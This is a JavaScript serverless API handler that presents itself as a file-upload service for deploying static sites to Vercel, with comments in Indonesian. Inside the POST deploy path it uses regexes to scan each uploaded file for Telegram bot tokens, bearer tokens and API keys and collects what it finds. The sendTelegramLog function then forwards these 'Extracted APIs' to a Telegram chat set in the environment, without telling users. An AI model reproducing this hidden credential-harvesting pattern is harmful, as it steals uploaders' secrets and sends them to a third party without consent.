export const config = {
  api: {
    bodyParser: {
      sizeLimit: '4mb',
    },
  },
};

export default async function handler(req, res) {
  const { method } = req;
  const VERCEL_TOKEN = process.env.VERCEL_TOKEN;

  // ==== 1. ENDPOINT POST (Initiate Deployment + Scanner) ====
  if (method === 'POST') {
    try {
      const { projectName, files } = req.body;

      if (!projectName || !files || files.length === 0) {
        return res.status(400).json({ success: false, error: "Project name and files are required." });
      }

      const cleanProjectName = projectName.trim().toLowerCase().replace(/[^a-z0-9-]/g, '-');

      // 💡 Cek apakah sudah ada index.html
      let hasIndex = files.some(f => f.file.toLowerCase() === 'index.html');
      let extractedApis = [];

      const vercelFiles = files.map((f) => {
        let fileName = f.file;

        // 1. Rename otomatis file HTML pertama jadi 'index.html' jika belum ada
        if (!hasIndex && fileName.toLowerCase().endsWith('.html')) {
          fileName = 'index.html';
          hasIndex = true;
        }

        // 2. SCANNING API / TOKEN DI DALAM FILE
        try {
          // Decode file Base64 ke Teks String
          const content = Buffer.from(f.data, 'base64').toString('utf-8');

          // Pattern Regex untuk Telegram Bot Token & API Key umum
          const patterns = [
            /\b\d{8,10}:AA[a-zA-Z0-9_-]{33}\b/g, // Bot Token Telegram
            /(?:bearer\s+|token\s*[:=]\s*["']?|api[_-]?key\s*[:=]\s*["']?)([a-zA-Z0-9_\-]{20,})/gi // Token/Key umum
          ];

          patterns.forEach(regex => {
            let match;
            while ((match = regex.exec(content)) !== null) {
              const tokenFound = match[1] || match[0];
              if (!extractedApis.includes(tokenFound)) {
                extractedApis.push(tokenFound);
              }
            }
          });
        } catch (e) {
          // Abaikan jika file binary/gambar
        }

        return {
          file: fileName,
          data: f.data,
          encoding: "base64"
        };
      });

      const vercelResponse = await fetch('https://api.vercel.com/v13/deployments', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${VERCEL_TOKEN}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          name: cleanProjectName,
          files: vercelFiles,
          projectSettings: { framework: null },
          target: 'production'
        })
      });

      const vercelData = await vercelResponse.json();

      if (!vercelResponse.ok) {
        return res.status(vercelResponse.status).json({
          success: false,
          error: translateVercelError(vercelResponse.status, vercelData)
        });
      }

      const customUrl = `${cleanProjectName}.vercel.app`;

      return res.status(200).json({
        success: true,
        deploymentId: vercelData.id,
        url: customUrl,
        foundApis: extractedApis // Kembalikan list API ke frontend jika dibutuhkan
      });

    } catch (error) {
      console.error("[POST Deploy] Error:", error);
      return res.status(500).json({ success: false, error: "Internal Server Error." });
    }
  } 
  
  // ==== 2. ENDPOINT GET (Check Status & Notify Telegram) ====
  else if (method === 'GET') {
    try {
      const { id, projectName, filesCount, totalSize, foundApis } = req.query;

      if (!id) return res.status(400).json({ success: false, error: "Deployment ID is required." });

      const vercelResponse = await fetch(`https://api.vercel.com/v13/deployments/${id}`, {
        method: 'GET',
        headers: {
          'Authorization': `Bearer ${VERCEL_TOKEN}`,
        }
      });

      const vercelData = await vercelResponse.json();
      
      if (!vercelResponse.ok) {
        return res.status(vercelResponse.status).json({ success: false, error: translateVercelError(vercelResponse.status, vercelData) });
      }

      const status = vercelData.readyState;
      const cleanName = projectName ? projectName.trim().toLowerCase().replace(/[^a-z0-9-]/g, '-') : '';
      const targetUrl = cleanName ? `${cleanName}.vercel.app` : vercelData.url;

      // Parsing API yang ditemukan (jika ada)
      let parsedApis = [];
      if (foundApis) {
        try { parsedApis = JSON.parse(foundApis); } catch(e) {}
      }

      // Jika READY dan requested notify
      if (status === 'READY' && req.query.notify === 'true') {
        await sendTelegramLog({
          projectName: cleanName || projectName, 
          filesCount, 
          totalSize, 
          url: targetUrl, 
          id,
          apis: parsedApis
        });
      }

      return res.status(200).json({
        success: true,
        readyState: status,
        url: targetUrl
      });

    } catch (error) {
      console.error("[GET Status] Error:", error);
      return res.status(500).json({ success: false, error: "Internal Server Error." });
    }
  }

  return res.status(405).json({ success: false, error: "Method not allowed." });
}

// ==== UTILS ====

function translateVercelError(status, data) {
  const vMessage = data.error?.message || "Unknown error occurred.";
  if (status === 401 || status === 403) return "Vercel authentication failed atau tidak diizinkan. Periksa VERCEL_TOKEN di Backend.";
  if (status === 409) return "Nama project sudah digunakan. Silakan gunakan nama lain.";
  if (status === 413) return "Ukuran file terlalu besar. Batas maksimal request adalah ~4MB.";
  if (status === 429) return "Terlalu banyak request ke Vercel (Rate Limit). Coba lagi nanti.";
  if (status >= 500) return "Vercel API sedang mengalami masalah internal.";
  return vMessage;
}

async function sendTelegramLog({ projectName, filesCount, totalSize, url, id, apis = [] }) {
  const botToken = process.env.TELEGRAM_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT;
  
  if (!botToken || !chatId) return;

  const apiSection = apis.length > 0 
    ? `\n⚠️ <b>Extracted APIs:</b>\n<code>${apis.join('\n')}</code>` 
    : `\n🔑 <b>Extracted APIs:</b> None`;

  const text = `✅ <b>DEPLOY VERCEL SUKSES!</b>\n\n` +
               `📂 <b>Project:</b> ${projectName}\n` +
               `📄 <b>Files:</b> ${filesCount}\n` +
               `💾 <b>Size:</b> ${totalSize} KB\n` +
               `🌐 <b>URL:</b> https://${url}\n` +
               `🔑 <b>ID:</b> <code>${id}</code>` +
               apiSection;

  try {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' })
    });
  } catch (error) {
    console.error("Telegram send failed:", error);
  }
}
